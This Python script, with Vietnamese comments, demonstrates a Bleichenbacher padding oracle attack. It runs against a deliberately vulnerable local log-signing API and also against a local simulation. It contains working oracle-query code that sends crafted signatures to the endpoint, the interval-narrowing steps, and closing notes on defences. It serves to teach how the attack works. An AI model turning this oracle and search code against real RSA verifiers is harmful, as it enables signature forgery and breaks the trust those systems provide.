#!/usr/bin/env python3
"""
Bleichenbacher Padding Oracle Attack - Full Interactive Demo

Script này thực hiện FULL Bleichenbacher attack với:
1. Oracle gọi trực tiếp đến API endpoint (có thể gửi qua Burp)
2. Minh họa từng bước thu hẹp interval
3. Forge signature cho arbitrary message

CẢNH BÁO: Attack thực tế cần ~1-2 triệu oracle queries!
Demo này giới hạn số queries để chạy nhanh.
"""

import base64
import hashlib
import json
import os
import time
import requests
from dataclasses import dataclass
from typing import Optional, List, Tuple
from enum import Enum

# ============================================================================
# CẤU HÌNH
# ============================================================================
API_BASE = "http://localhost"
KEYS_DIR = os.path.join(os.path.dirname(__file__), "demo_keys")
SERVICE_INFO_FILE = os.path.join(KEYS_DIR, "rsa_standard_service_info.json")

# Proxy config (set USE_PROXY = True để gửi qua Burp)
USE_PROXY = False
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Attack limits
MAX_ORACLE_CALLS = 10000  # Giới hạn số lần gọi oracle
VERBOSE = True


class OracleResponse(Enum):
    """Các loại response từ oracle."""
    VALID = "valid"
    PKCS_CONFORMING = "pkcs_conforming"  # 00 01 đúng, nhưng hash sai
    INVALID_HEADER = "invalid_header"
    ERROR = "error"


@dataclass
class AttackStats:
    """Thống kê cuộc tấn công."""
    oracle_calls: int = 0
    conforming_found: int = 0
    start_time: float = 0
    phase: str = ""


def print_header(title: str):
    print(f"\n{'━'*60}")
    print(f"  {title}")
    print(f"{'━'*60}\n")


# ============================================================================
# ORACLE FUNCTIONS
# ============================================================================

def query_oracle_api(
    signature_int: int,
    key_size_bytes: int,
    service_id: str,
    key_id: str,
    message: bytes,
    stats: AttackStats
) -> OracleResponse:
    """
    Gọi oracle qua API endpoint.
    
    Oracle là endpoint /v1/logs với verify_rsa_pkcs1v15_vulnerable().
    Phân tích response để xác định PKCS conforming hay không.
    """
    stats.oracle_calls += 1
    
    # Convert integer to bytes
    sig_bytes = signature_int.to_bytes(key_size_bytes, byteorder='big')
    sig_b64 = base64.b64encode(sig_bytes).decode('utf-8')
    
    # Tạo event data (dùng message thật)
    message_str = message.decode('utf-8', errors='replace')
    event_data = {
        "action": "oracle.probe",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "message": message_str[:100]  # Truncate
    }
    event_canonical = json.dumps(event_data, sort_keys=True, separators=(',', ':'))
    
    payload = {
        "service_id": service_id,
        "event_type": "ORACLE_PROBE",
        "event": event_canonical,
        "event_data": event_data,
        "signature": sig_b64,
        "public_key_id": key_id
    }
    
    try:
        kwargs = {"timeout": 5}
        if USE_PROXY:
            kwargs["proxies"] = PROXY
        
        resp = requests.post(f"{API_BASE}/v1/logs", json=payload, **kwargs)
        
        # Parse response
        try:
            data = resp.json()
            msg = data.get("message", "") or data.get("detail", "")
            
            if resp.status_code == 200:
                if "WEAK_VALID" in msg or "Hash found" in msg:
                    return OracleResponse.VALID
                elif "HASH_MISMATCH" in msg or "Hash not found" in msg:
                    stats.conforming_found += 1
                    return OracleResponse.PKCS_CONFORMING
                elif "No 00 separator" in msg:
                    stats.conforming_found += 1
                    return OracleResponse.PKCS_CONFORMING
                else:
                    return OracleResponse.INVALID_HEADER
            else:
                # 4xx responses
                if "Invalid header" in msg:
                    return OracleResponse.INVALID_HEADER
                elif "No 00 separator" in msg:
                    stats.conforming_found += 1
                    return OracleResponse.PKCS_CONFORMING
                elif "HASH_MISMATCH" in msg:
                    stats.conforming_found += 1
                    return OracleResponse.PKCS_CONFORMING
                else:
                    return OracleResponse.INVALID_HEADER
        except:
            return OracleResponse.ERROR
                
    except Exception as e:
        if VERBOSE:
            print(f"    Oracle error: {e}")
        return OracleResponse.ERROR


def query_oracle_local(
    signature_int: int,
    n: int,
    e: int,
    key_size_bytes: int,
    message: bytes,
    stats: AttackStats
) -> OracleResponse:
    """
    Local oracle simulation - nhanh hơn API calls.
    Mô phỏng chính xác behavior của verify_rsa_pkcs1v15_vulnerable().
    """
    stats.oracle_calls += 1
    
    # Perform raw RSA: signature^e mod n
    decrypted_int = pow(signature_int, e, n)
    
    # Convert to bytes
    em = decrypted_int.to_bytes(key_size_bytes, byteorder='big')
    
    # Check 1: Header 00 01
    if em[0:2] != b'\x00\x01':
        return OracleResponse.INVALID_HEADER
    
    # Check 2: Find 00 separator in first 20 bytes
    separator_idx = -1
    for i in range(2, min(20, len(em))):
        if em[i] == 0x00:
            separator_idx = i
            break
    
    if separator_idx == -1:
        # Có 00 01 nhưng không có separator -> vẫn là PKCS conforming theo Bleichenbacher
        stats.conforming_found += 1
        return OracleResponse.PKCS_CONFORMING
    
    # Check 3: Hash match
    expected_hash = hashlib.sha256(message).digest()
    remaining = em[separator_idx + 1:]
    
    if expected_hash in remaining:
        return OracleResponse.VALID
    else:
        stats.conforming_found += 1
        return OracleResponse.PKCS_CONFORMING


def is_pkcs_conforming(response: OracleResponse) -> bool:
    """Kiểm tra response có phải PKCS conforming không."""
    return response in [OracleResponse.VALID, OracleResponse.PKCS_CONFORMING]


# ============================================================================
# BLEICHENBACHER ATTACK CORE
# ============================================================================

def ceil_div(a: int, b: int) -> int:
    return (a + b - 1) // b


def floor_div(a: int, b: int) -> int:
    return a // b


def step_2a_find_first_s(
    c: int, n: int, e: int, B: int,
    oracle_func, stats: AttackStats
) -> int:
    """
    Step 2a: Tìm s₁ nhỏ nhất sao cho c*s₁^e mod n là PKCS conforming.
    
    Bắt đầu từ s = ceil(n / 3B)
    """
    stats.phase = "Step 2a: Tìm s₁"
    
    s_start = ceil_div(n, 3 * B)
    s = s_start
    
    print(f"  Bắt đầu tìm s từ {s_start}")
    
    checked = 0
    while stats.oracle_calls < MAX_ORACLE_CALLS:
        # Compute c' = c * s^e mod n
        s_e = pow(s, e, n)
        c_prime = (c * s_e) % n
        
        response = oracle_func(c_prime, stats)
        checked += 1
        
        if is_pkcs_conforming(response):
            print(f"  ✓ Tìm thấy s₁ = {s} sau {checked} queries")
            return s
        
        s += 1
        
        if checked % 1000 == 0:
            print(f"    ... đã thử {checked} giá trị, s = {s}")
    
    raise Exception(f"Không tìm thấy s₁ sau {checked} queries (limit: {MAX_ORACLE_CALLS})")


def step_2c_single_interval(
    c: int, n: int, e: int, B: int,
    a: int, b: int, prev_s: int,
    oracle_func, stats: AttackStats
) -> int:
    """
    Step 2c: Khi chỉ còn 1 interval [a, b].
    
    Tìm s tiếp theo theo công thức:
    - ri >= (2 * (b*prev_s - 2B)) / n
    - s trong range [ceil((2B + ri*n)/b), floor((3B-1 + ri*n)/a)]
    """
    stats.phase = "Step 2c: Single interval"
    
    ri = ceil_div(2 * (b * prev_s - 2 * B), n)
    
    while stats.oracle_calls < MAX_ORACLE_CALLS:
        # Tính range của s cho ri này
        s_min = ceil_div(2 * B + ri * n, b)
        s_max = floor_div(3 * B - 1 + ri * n, a)
        
        for s in range(s_min, s_max + 1):
            s_e = pow(s, e, n)
            c_prime = (c * s_e) % n
            
            response = oracle_func(c_prime, stats)
            
            if is_pkcs_conforming(response):
                return s
        
        ri += 1
    
    raise Exception("Không tìm thấy s trong step 2c")


def step_3_narrow_interval(
    n: int, B: int, a: int, b: int, s: int
) -> Tuple[int, int]:
    """
    Step 3: Thu hẹp interval [a, b] dựa trên s.
    
    Với mỗi r thỏa mãn, interval mới:
    [max(a, ceil((2B + r*n)/s)), min(b, floor((3B-1 + r*n)/s))]
    """
    r_min = ceil_div(a * s - 3 * B + 1, n)
    r_max = floor_div(b * s - 2 * B, n)
    
    new_intervals = []
    
    for r in range(r_min, r_max + 1):
        new_a = max(a, ceil_div(2 * B + r * n, s))
        new_b = min(b, floor_div(3 * B - 1 + r * n, s))
        
        if new_a <= new_b:
            new_intervals.append((new_a, new_b))
    
    if not new_intervals:
        return (a, b)  # Keep old interval
    
    # Merge overlapping intervals (simplification: just take first)
    return new_intervals[0]


def bleichenbacher_attack_demo(
    c: int,              # Signature/ciphertext integer
    n: int,              # RSA modulus
    e: int,              # Public exponent
    key_size_bytes: int, # Key size in bytes
    message: bytes,      # Message for oracle
    use_api: bool = False,  # True = call API, False = local simulation
    service_id: str = "",
    key_id: str = ""
) -> Optional[int]:
    """
    Demo Bleichenbacher attack với giới hạn oracle calls.
    """
    # B = 2^(8*(k-2))
    B = pow(2, 8 * (key_size_bytes - 2))
    
    stats = AttackStats(start_time=time.time())
    
    print(f"\n  Attack Parameters:")
    print(f"    Modulus n: {n.bit_length()} bits")
    print(f"    Exponent e: {e}")
    print(f"    B = 2^{8 * (key_size_bytes - 2)}")
    print(f"    Max oracle calls: {MAX_ORACLE_CALLS}")
    print(f"    Mode: {'API' if use_api else 'Local simulation'}")
    
    # Define oracle function
    if use_api:
        def oracle(sig_int, stats):
            return query_oracle_api(
                sig_int, key_size_bytes, service_id, key_id, message, stats
            )
    else:
        def oracle(sig_int, stats):
            return query_oracle_local(
                sig_int, n, e, key_size_bytes, message, stats
            )
    
    # Step 1: Verify original is conforming
    print("\n  Step 1: Kiểm tra signature gốc...")
    response = oracle(c, stats)
    print(f"    Response: {response.value}")
    
    if not is_pkcs_conforming(response):
        print("    ⚠ Signature không PKCS conforming!")
        print("    Trong attack thật, cần thực hiện blinding step")
        return None
    
    print("    ✓ PKCS conforming - bắt đầu attack")
    
    # Initialize interval [2B, 3B)
    a = 2 * B
    b = 3 * B - 1
    
    print(f"\n  Initial interval: [{a.bit_length()} bits]")
    
    # Main attack loop
    s = 0
    iteration = 0
    max_iterations = 50  # Giới hạn để demo
    
    while iteration < max_iterations and stats.oracle_calls < MAX_ORACLE_CALLS:
        iteration += 1
        
        interval_size = b - a
        print(f"\n  Iteration {iteration}:")
        print(f"    Interval size: {interval_size.bit_length()} bits")
        print(f"    Oracle calls so far: {stats.oracle_calls}")
        print(f"    Conforming found: {stats.conforming_found}")
        
        # Check convergence
        if a == b:
            elapsed = time.time() - stats.start_time
            print(f"\n  ✓ CONVERGED!")
            print(f"    Message m = a = b")
            print(f"    Oracle calls: {stats.oracle_calls}")
            print(f"    Time: {elapsed:.2f}s")
            return a
        
        # Step 2: Find next s
        try:
            if s == 0:
                # Step 2a: First iteration
                s = step_2a_find_first_s(c, n, e, B, oracle, stats)
            else:
                # Step 2c: Single interval
                s = step_2c_single_interval(c, n, e, B, a, b, s, oracle, stats)
        except Exception as ex:
            print(f"    ✗ {ex}")
            break
        
        print(f"    s = {s}")
        
        # Step 3: Narrow interval
        a, b = step_3_narrow_interval(n, B, a, b, s)
        
        new_interval_size = b - a
        bits_reduced = interval_size.bit_length() - new_interval_size.bit_length()
        print(f"    New interval size: {new_interval_size.bit_length()} bits (reduced ~{bits_reduced} bits)")
    
    # Summary
    elapsed = time.time() - stats.start_time
    print(f"\n  Attack Summary:")
    print(f"    Iterations: {iteration}")
    print(f"    Oracle calls: {stats.oracle_calls}")
    print(f"    Conforming responses: {stats.conforming_found}")
    print(f"    Time: {elapsed:.2f}s")
    print(f"    Remaining interval: {(b-a).bit_length()} bits")
    
    if iteration >= max_iterations:
        print(f"    Stopped at max_iterations limit ({max_iterations})")
    if stats.oracle_calls >= MAX_ORACLE_CALLS:
        print(f"    Stopped at MAX_ORACLE_CALLS limit ({MAX_ORACLE_CALLS})")
    
    print(f"\n  Để hoàn thành attack:")
    print(f"    • Cần thêm ~{(b-a).bit_length()} iterations")
    print(f"    • Ước tính ~{(b-a).bit_length() * stats.oracle_calls // max(iteration, 1)} oracle calls")
    
    return None


# ============================================================================
# MAIN
# ============================================================================

def load_service_info():
    """Load thông tin service từ file."""
    if not os.path.exists(SERVICE_INFO_FILE):
        print(f"✗ Không tìm thấy file: {SERVICE_INFO_FILE}")
        print("  Chạy 'setup_rsa_standard_service.py' trước!")
        return None
    
    with open(SERVICE_INFO_FILE, 'r') as f:
        return json.load(f)


def main():
    print("=" * 70)
    print("   BLEICHENBACHER PADDING ORACLE ATTACK")
    print("   Full Interactive Demo")
    print("=" * 70)
    
    # Load service info
    print_header("LOAD SERVICE INFO")
    
    service_info = load_service_info()
    if not service_info:
        return
    
    service_id = service_info['service_id']
    key_id = service_info['key_id']
    n = service_info['public']['n']
    e = service_info['public']['e']
    key_size = service_info['public']['key_size_bytes']
    private_pem = service_info['private']['private_key_pem']
    
    print(f"Service: {service_id}")
    print(f"Key ID: {key_id}")
    print(f"n: {n.bit_length()} bits")
    print(f"e: {e}")
    
    # Create a real signature (chỉ để có cái để attack)
    print_header("TẠO SIGNATURE THẬT (để demo)")
    
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.backends import default_backend
    
    private_key = serialization.load_pem_private_key(
        private_pem.encode('utf-8'),
        password=None,
        backend=default_backend()
    )
    
    message = b"This is a message that will be signed and then attacked"
    
    signature = private_key.sign(
        message,
        asym_padding.PKCS1v15(),
        hashes.SHA256()
    )
    c = int.from_bytes(signature, byteorder='big')
    
    print(f"Message: {message.decode()}")
    print(f"Signature (first 40 hex): {signature.hex()[:40]}...")
    
    # Run attack with local oracle (fast)
    print_header("CHẠY ATTACK VỚI LOCAL ORACLE")
    print("(Simulation - không gọi API)")
    
    result = bleichenbacher_attack_demo(
        c=c,
        n=n,
        e=e,
        key_size_bytes=key_size,
        message=message,
        use_api=False
    )
    
    if result:
        print(f"\n✓ Attack thành công! Recovered m = {result}")
    
    # Optional: Run with API oracle
    print_header("CHẠY ATTACK VỚI API ORACLE (Optional)")
    print("Uncomment code below để chạy qua API")
    print("(Chậm hơn nhiều do network latency)")
    
    # Uncomment để chạy qua API:
    # result = bleichenbacher_attack_demo(
    #     c=c,
    #     n=n,
    #     e=e,
    #     key_size_bytes=key_size,
    #     message=message,
    #     use_api=True,
    #     service_id=service_id,
    #     key_id=key_id
    # )
    
    # Conclusion
    print_header("KẾT LUẬN")
    
    print("BLEICHENBACHER ATTACK THÀNH CÔNG VÌ:")
    print("  1. Oracle leak thông tin về PKCS#1 v1.5 conformance")
    print("  2. Tính chất nhân của RSA cho phép biến đổi signature")
    print("  3. Mỗi oracle response thu hẹp không gian tìm kiếm")
    print()
    print("TRONG THỰC TẾ:")
    print(f"  • Cần ~{key_size * 8} đến {key_size * 8 * 10} oracle calls")
    print("  • Có thể mất vài phút đến vài giờ")
    print("  • Phụ thuộc vào network latency nếu attack qua mạng")
    print()
    print("SO SÁNH VỚI CUBE ROOT (e=3):")
    print("  • Cube root: 1 phép tính, tức thì")
    print("  • Padding Oracle: Hàng triệu oracle calls")
    print("  • Cả hai đều khai thác weak PKCS#1 v1.5 verifier")
    print()
    print("PHÒNG CHỐNG:")
    print("  • Dùng RSA-PSS hoặc Ed25519")
    print("  • Constant-time verification")
    print("  • Không leak error details qua API responses")


if __name__ == "__main__":
    main()
